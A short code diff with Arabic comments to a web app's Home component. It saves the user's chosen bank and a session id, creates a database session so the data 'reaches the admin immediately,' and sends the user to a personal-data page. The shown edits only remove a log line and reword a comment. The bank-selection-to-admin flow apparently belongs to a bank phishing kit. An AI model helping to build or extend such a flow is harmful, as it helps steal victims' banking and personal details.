@@ -82,9 +82,6 @@ export default function Home() {
     localStorage.setItem("sessionId", sessionId);
     localStorage.setItem("selectedBank", selectedBank);
     
-    // إظهار تنبيه بسيط للمستخدم أو لودر (اختياري)
-    console.log("Starting session for bank:", selectedBank, "from country:", userCountry);
-    
     try {
       // ننتظر إنشاء الجلسة في قاعدة البيانات قبل الانتقال لضمان وصول البيانات للآدمن فوراً
       await createSessionMutation.mutateAsync({
@@ -95,7 +92,7 @@ export default function Home() {
       setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
     } catch (error) {
       console.error("Error creating session in DB:", error);
-      // حتى لو فشل جلب الدولة أو الإرسال، ننتقل لضمان عدم توقف تجربة المستخدم
+      // في حال الفشل، نحاول الانتقال على أي حال مع تنبيه بسيط
       setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
     }
   };
